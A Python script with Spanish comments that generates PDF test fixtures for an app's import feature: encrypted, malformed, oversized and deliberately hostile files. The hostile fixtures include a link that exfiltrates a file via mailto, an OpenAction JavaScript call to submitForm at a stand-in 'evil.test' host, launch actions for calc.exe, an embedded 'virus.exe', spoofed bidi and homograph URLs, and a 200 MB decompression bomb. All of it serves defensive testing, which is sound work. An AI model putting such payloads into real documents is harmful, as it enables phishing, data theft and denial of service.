#!/usr/bin/env python3
"""Genera los ficheros de prueba de la importación de PDF (spec 008, T-008-04).

    python3 tools/fixtures/gen_pdf_fixtures.py

Sin dependencias (salvo Pillow, solo para el PDF "escaneado" de CL-008-5): los PDF se
escriben a mano, incluidos los cifrados (gestor estándar de PDF, RC4 de 40 bits, R2).
Escribe:
  - tools/fixtures/out/<nombre>        los ficheros, para inspeccionarlos (no se versionan);
  - app/integration_test/fixtures/pdf_fixtures.g.dart   los pequeños en base64, para que
    el test de integración los lleve dentro sin empaquetarlos en la app;
  - app/test/fixtures/one_page.pdf     un PDF válido y pequeño para los tests unitarios.

El PDF escaneado de 20 páginas (~10 MB) solo va a `out/`: es para medir la memoria en el
móvil (T-008-22) y no cabe en el código del test.
"""
import base64
import hashlib
import io
import os
import zlib

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
OUT = os.path.join(ROOT, 'tools', 'fixtures', 'out')
DART = os.path.join(ROOT, 'app', 'integration_test', 'fixtures', 'pdf_fixtures.g.dart')
UNIT = os.path.join(ROOT, 'app', 'test', 'fixtures', 'one_page.pdf')

A4 = (595, 842)
FILE_ID = hashlib.md5(b'una-pdf-fixtures').digest()


# --- Escritor mínimo de PDF ----------------------------------------------------------

class Pdf:
    """Objetos numerados desde 1; `ref(n)` devuelve la referencia `n 0 R`."""

    def __init__(self):
        self.objs = []  # (cuerpo, datos de flujo o None)

    def add(self, body=b'', stream=None):
        self.objs.append([body, stream])
        return len(self.objs)

    def set(self, n, body, stream=None):
        self.objs[n - 1] = [body, stream]

    def build(self, root, encrypt=None, header=b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'):
        """[encrypt] = (clave, número del objeto /Encrypt) para cifrar los flujos."""
        out = bytearray(header)
        offsets = []
        for i, (body, stream) in enumerate(self.objs, start=1):
            offsets.append(len(out))
            out += b'%d 0 obj\n' % i
            if stream is not None:
                data = stream
                if encrypt and i != encrypt[1]:
                    data = rc4(object_key(encrypt[0], i), data)
                out += body + b' /Length %d >>\nstream\n' % len(data) + data + b'\nendstream'
            else:
                out += body
            out += b'\nendobj\n'
        xref = len(out)
        out += b'xref\n0 %d\n0000000000 65535 f \n' % (len(self.objs) + 1)
        for off in offsets:
            out += b'%010d 00000 n \n' % off
        trailer = b'<< /Size %d /Root %d 0 R /ID [<%s> <%s>]' % (
            len(self.objs) + 1, root, FILE_ID.hex().encode(), FILE_ID.hex().encode())
        if encrypt:
            trailer += b' /Encrypt %d 0 R' % encrypt[1]
        out += b'trailer\n' + trailer + b' >>\nstartxref\n%d\n%%%%EOF\n' % xref
        return bytes(out)


def text_stream(lines, size=24, top=780):
    """Contenido de página con texto en Helvetica (el texto que lee el lector, CA-008-20)."""
    ops = [b'BT /F1 %d Tf 50 %d Td' % (size, top)]
    for i, line in enumerate(lines):
        if i:
            ops.append(b'0 -%d Td' % int(size * 1.4))
        ops.append(b'(' + line.encode('latin-1') + b') Tj')
    ops.append(b'ET')
    return b'\n'.join(ops)


def simple_pdf(pages, annots_for=None, extra_catalog=b'', sizes=None):
    """[pages]: lista de listas de líneas. [annots_for](pdf, page_refs, i) → lista de anotaciones."""
    pdf = Pdf()
    catalog = pdf.add()
    pages_obj = pdf.add()
    font = pdf.add(b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
    page_refs = [pdf.add() for _ in pages]
    for i, lines in enumerate(pages):
        w, h = (sizes[i] if sizes else A4)
        content = pdf.add(b'<<', text_stream(lines, top=h - 60))
        annots = b''
        if annots_for:
            refs = [pdf.add(a) for a in annots_for(pdf, page_refs, i)]
            if refs:
                annots = b' /Annots [' + b' '.join(b'%d 0 R' % r for r in refs) + b']'
        pdf.set(page_refs[i], b'<< /Type /Page /Parent %d 0 R /MediaBox [0 0 %d %d] /Contents %d 0 R '
                b'/Resources << /Font << /F1 %d 0 R >> >>%s >>' % (pages_obj, w, h, content, font, annots))
    pdf.set(pages_obj, b'<< /Type /Pages /Kids [%s] /Count %d >>' % (
        b' '.join(b'%d 0 R' % r for r in page_refs), len(pages)))
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R%s >>' % (pages_obj, extra_catalog))
    return pdf, catalog


def page_lines(n, total):
    return [f'Pagina {n} de {total}', 'PDF-FIXTURE texto de prueba', 'Horario: 10:00 Apertura']


# --- Cifrado estándar de PDF (RC4, 40 bits, R2) -----------------------------------------

PAD = bytes.fromhex('28bf4e5e4e758a4164004e56fffa01082e2e00b6d0683e802f0ca9fe6453697a')


def rc4(key, data):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def padded(pw):
    return (pw + PAD)[:32]


def encryption(user_pw, owner_pw, perms=-44):
    """Devuelve (clave, diccionario /Encrypt). Algoritmos 2, 3 y 4 de ISO 32000-1 §7.6.3."""
    o = rc4(hashlib.md5(padded(owner_pw)).digest()[:5], padded(user_pw))
    key = hashlib.md5(padded(user_pw) + o + perms.to_bytes(4, 'little', signed=True) + FILE_ID).digest()[:5]
    u = rc4(key, PAD)
    enc = b'<< /Filter /Standard /V 1 /R 2 /Length 40 /O <%s> /U <%s> /P %d >>' % (
        o.hex().encode(), u.hex().encode(), perms)
    return key, enc


def object_key(key, num):
    return hashlib.md5(key + num.to_bytes(3, 'little') + b'\x00\x00').digest()[:len(key) + 5]


def encrypted_pdf(user_pw, owner_pw):
    pdf, catalog = simple_pdf([page_lines(1, 2), page_lines(2, 2)])
    key, enc = encryption(user_pw, owner_pw)
    enc_obj = pdf.add(enc)
    return pdf.build(catalog, encrypt=(key, enc_obj))


# --- Ficheros ----------------------------------------------------------------------------

def link(rect, action):
    return b'<< /Type /Annot /Subtype /Link /Rect [%d %d %d %d] /Border [0 0 0] /A %s >>' % (*rect, action)


def links_pdf():
    """Enlaces de todos los esquemas (CA-008-12). Cada uno sobre una línea de texto."""
    targets = [
        ('https web', b'<< /S /URI /URI (https://example.com/programa) >>'),
        ('http web', b'<< /S /URI /URI (http://example.org/) >>'),
        ('https con usuario', b'<< /S /URI /URI (https://user:pass@example.com/) >>'),
        ('mailto con cc y adjunto', b'<< /S /URI /URI (mailto:info@example.com?subject=Hola&cc=x@evil.test'
                                    b'&attach=/data/data/secret&body=Texto) >>'),
        ('tel', b'<< /S /URI /URI (tel:+34600000000) >>'),
        ('javascript', b'<< /S /URI /URI (javascript:alert\\(1\\)) >>'),
        ('file', b'<< /S /URI /URI (file:///data/data/invalid.pending.app/) >>'),
        ('intent', b'<< /S /URI /URI (intent://scan/#Intent;scheme=zxing;end) >>'),
        ('data', b'<< /S /URI /URI (data:text/html,<h1>x</h1>) >>'),
        ('launch', b'<< /S /Launch /F (calc.exe) >>'),
        ('accion javascript', b'<< /S /JavaScript /JS (app.alert\\(1\\)) >>'),
        ('bidi', b'<< /S /URI /URI (https://example.com/\xe2\x80\xaegnp.exe) >>'),
        ('idn mezclado', b'<< /S /URI /URI (https://xn--pple-43d.com/) >>'),
    ]
    lines = [f'Enlace {name}' for name, _ in targets] + ['Ir a la pagina 2']

    def annots(pdf, page_refs, i):
        if i != 0:
            return []
        out = []
        for k, (_, action) in enumerate(targets):
            y = A4[1] - 60 - int(24 * 1.4) * k
            out.append(link((45, y - 8, 400, y + 24), action))
        y = A4[1] - 60 - int(24 * 1.4) * len(targets)
        out.append(link((45, y - 8, 400, y + 24), b'<< /S /GoTo /D [%d 0 R /Fit] >>' % page_refs[1]))
        return out

    pdf, catalog = simple_pdf([lines, page_lines(2, 2)], annots_for=annots)
    return pdf.build(catalog)


def js_form_pdf():
    """JavaScript al abrir, formulario y archivo incrustado: nada se ejecuta ni se rellena."""
    pdf = Pdf()
    catalog = pdf.add()
    pages = pdf.add()
    font = pdf.add(b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
    page = pdf.add()
    content = pdf.add(b'<<', text_stream(['Formulario', 'PDF-FIXTURE con JavaScript']))
    field = pdf.add(b'<< /Type /Annot /Subtype /Widget /FT /Tx /T (nombre) /V (SECRET-FORM) '
                    b'/Rect [50 600 300 630] /P %d 0 R /AA << /K << /S /JavaScript /JS (app.alert\\(2\\)) >> >> >>' % page)
    js = pdf.add(b'<< /S /JavaScript /JS (app.alert\\("SECRET-JS"\\); this.submitForm\\("https://evil.test"\\);) >>')
    ef = pdf.add(b'<< /Type /EmbeddedFile', b'SECRET-EMBEDDED')
    spec = pdf.add(b'<< /Type /Filespec /F (virus.exe) /EF << /F %d 0 R >> >>' % ef)
    pdf.set(page, b'<< /Type /Page /Parent %d 0 R /MediaBox [0 0 595 842] /Contents %d 0 R '
            b'/Resources << /Font << /F1 %d 0 R >> >> /Annots [%d 0 R] >>' % (pages, content, font, field))
    pdf.set(pages, b'<< /Type /Pages /Kids [%d 0 R] /Count 1 >>' % page)
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R /OpenAction %d 0 R /AcroForm << /Fields [%d 0 R] >> '
            b'/Names << /EmbeddedFiles << /Names [(virus.exe) %d 0 R] >> >> >>' % (pages, js, field, spec))
    return pdf.build(catalog)


def cyclic_pdf():
    """El árbol de páginas se apunta a sí mismo."""
    pdf = Pdf()
    catalog = pdf.add()
    a = pdf.add()
    b = pdf.add()
    pdf.set(a, b'<< /Type /Pages /Kids [%d 0 R] /Count 1 >>' % b)
    pdf.set(b, b'<< /Type /Pages /Parent %d 0 R /Kids [%d 0 R] /Count 1 >>' % (a, a))
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R >>' % a)
    return pdf.build(catalog)


def bomb_pdf(megabytes=200):
    """Contenido de página comprimido que se expande a [megabytes] MB de espacios."""
    comp = zlib.compressobj(9)
    chunk = b' ' * (1 << 20)
    data = b''.join(comp.compress(chunk) for _ in range(megabytes)) + comp.flush()
    pdf = Pdf()
    catalog = pdf.add()
    pages = pdf.add()
    content = pdf.add(b'<< /Filter /FlateDecode', data)
    page = pdf.add(b'<< /Type /Page /Parent %d 0 R /MediaBox [0 0 595 842] /Contents %d 0 R >>' % (pages, content))
    pdf.set(pages, b'<< /Type /Pages /Kids [%d 0 R] /Count 1 >>' % page)
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R >>' % pages)
    return pdf.build(catalog)


def many_pages_pdf(n):
    """[n] páginas que comparten un mismo contenido (pequeño aunque sean miles)."""
    pdf = Pdf()
    catalog = pdf.add()
    pages = pdf.add()
    font = pdf.add(b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
    content = pdf.add(b'<<', text_stream(['Pagina repetida', 'PDF-FIXTURE']))
    refs = [pdf.add(b'<< /Type /Page /Parent %d 0 R /MediaBox [0 0 595 842] /Contents %d 0 R '
                    b'/Resources << /Font << /F1 %d 0 R >> >> >>' % (pages, content, font)) for _ in range(n)]
    pdf.set(pages, b'<< /Type /Pages /Kids [%s] /Count %d >>' % (b' '.join(b'%d 0 R' % r for r in refs), n))
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R >>' % pages)
    return pdf.build(catalog)


def broken_page_pdf():
    """CL-008-4: tres páginas; la 2 no se puede dibujar (flujo comprimido corrupto y una
    imagen que no existe). La 1 y la 3 tienen texto."""
    pdf, catalog = simple_pdf([page_lines(i, 3) for i in (1, 2, 3)])
    # Objetos de simple_pdf: catálogo 1, páginas 2, fuente 3, páginas 4-6 y sus
    # contenidos 7-9. Se estropea el contenido de la página 2 (objeto 8).
    garbage = bytes((i * 37 + 11) % 256 for i in range(512))
    pdf.set(8, b'<< /Filter /FlateDecode', b'x\x9c' + garbage)
    pdf.set(5, b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 8 0 R '
               b'/Resources << /XObject << /Im0 99 0 R >> >> >>')
    return pdf.build(catalog)


def zero_pages_pdf():
    pdf = Pdf()
    catalog = pdf.add()
    pages = pdf.add(b'<< /Type /Pages /Kids [] /Count 0 >>')
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R >>' % pages)
    return pdf.build(catalog)


def scanned_pdf(pages=20, target=9_600_000):
    """Páginas con una imagen JPEG de ruido (no se comprime): el caso más pesado admitido."""
    from PIL import Image  # solo para este fichero

    per_page = target // pages
    side = 1400
    quality = 95
    pdf = Pdf()
    catalog = pdf.add()
    pages_obj = pdf.add()
    refs = []
    for i in range(pages):
        buf = io.BytesIO()
        Image.frombytes('RGB', (side, side), os.urandom(side * side * 3)).save(buf, 'JPEG', quality=quality)
        jpg = buf.getvalue()
        while len(jpg) > per_page and side > 400:
            side -= 100
            buf = io.BytesIO()
            Image.frombytes('RGB', (side, side), os.urandom(side * side * 3)).save(buf, 'JPEG', quality=quality)
            jpg = buf.getvalue()
        img = pdf.add(b'<< /Type /XObject /Subtype /Image /Width %d /Height %d /ColorSpace /DeviceRGB '
                      b'/BitsPerComponent 8 /Filter /DCTDecode' % (side, side), jpg)
        content = pdf.add(b'<<', b'q 595 0 0 842 0 0 cm /Im0 Do Q')
        refs.append(pdf.add(b'<< /Type /Page /Parent %d 0 R /MediaBox [0 0 595 842] /Contents %d 0 R '
                            b'/Resources << /XObject << /Im0 %d 0 R >> >> >>' % (pages_obj, content, img)))
    pdf.set(pages_obj, b'<< /Type /Pages /Kids [%s] /Count %d >>' % (b' '.join(b'%d 0 R' % r for r in refs), pages))
    pdf.set(catalog, b'<< /Type /Catalog /Pages %d 0 R >>' % pages_obj)
    return pdf.build(catalog)


def main():
    os.makedirs(OUT, exist_ok=True)
    files = {}

    one, cat = simple_pdf([['Horario del congreso', 'PDF-FIXTURE', 'Sala 1: 10:00']])
    files['one_page.pdf'] = one.build(cat)

    three, cat = simple_pdf([page_lines(i, 3) for i in (1, 2, 3)],
                            sizes=[A4, (842, 595), (300, 400)])  # CL-008-10
    files['mixed_sizes.pdf'] = three.build(cat)

    p20, cat = simple_pdf([page_lines(i, 20) for i in range(1, 21)])
    files['pages_20.pdf'] = p20.build(cat)
    p21, cat = simple_pdf([page_lines(i, 21) for i in range(1, 22)])
    files['pages_21.pdf'] = p21.build(cat)

    files['links.pdf'] = links_pdf()
    files['js_form.pdf'] = js_form_pdf()
    files['protected_user.pdf'] = encrypted_pdf(b'secreto', b'owner')      # CL-008-1
    files['protected_owner_only.pdf'] = encrypted_pdf(b'', b'owner')       # CL-008-2

    # Cabecera tras basura (válido: %PDF- en los primeros 1024 bytes).
    files['header_offset.pdf'] = b'\x00' * 100 + files['one_page.pdf']

    # Malformados (CA-008-14).
    files['truncated.pdf'] = files['pages_20.pdf'][: len(files['pages_20.pdf']) * 6 // 10]
    files['cyclic.pdf'] = cyclic_pdf()
    files['bomb.pdf'] = bomb_pdf()
    files['zero_pages.pdf'] = zero_pages_pdf()
    files['broken_page.pdf'] = broken_page_pdf()                         # CL-008-4
    files['pages_10000.pdf'] = many_pages_pdf(10000)
    files['html_as.pdf'] = b'<!DOCTYPE html><html><body><script>alert(1)</script>%PDF-1.7</body></html>'
    files['zip_as.pdf'] = b'PK\x03\x04' + b'\x14\x00' + b'\x00' * 24 + b'[Content_Types].xml' + b'\x00' * 64
    files['header_late.pdf'] = b' ' * 1100 + files['one_page.pdf']        # %PDF- después de 1024 → no
    files['empty.pdf'] = b''

    for name, data in files.items():
        with open(os.path.join(OUT, name), 'wb') as f:
            f.write(data)

    scanned = scanned_pdf()
    with open(os.path.join(OUT, 'scanned_20p.pdf'), 'wb') as f:
        f.write(scanned)
    assert len(scanned) <= 10_000_000, len(scanned)

    os.makedirs(os.path.dirname(UNIT), exist_ok=True)
    with open(UNIT, 'wb') as f:
        f.write(files['one_page.pdf'])

    os.makedirs(os.path.dirname(DART), exist_ok=True)
    with open(DART, 'w') as f:
        f.write('// GENERADO por tools/fixtures/gen_pdf_fixtures.py. No editar a mano.\n')
        f.write('// Ficheros de prueba de la importación de PDF (spec 008, T-008-04).\n\n')
        f.write('/// Nombre → contenido en base64.\n')
        f.write('const Map<String, String> pdfFixtures = {\n')
        for name, data in files.items():
            f.write(f"  '{name}': '{base64.b64encode(data).decode()}',\n")
        f.write('};\n')

    for name, data in sorted(files.items()) + [('scanned_20p.pdf', scanned)]:
        print(f'{name:28} {len(data):>10} bytes')


if __name__ == '__main__':
    main()
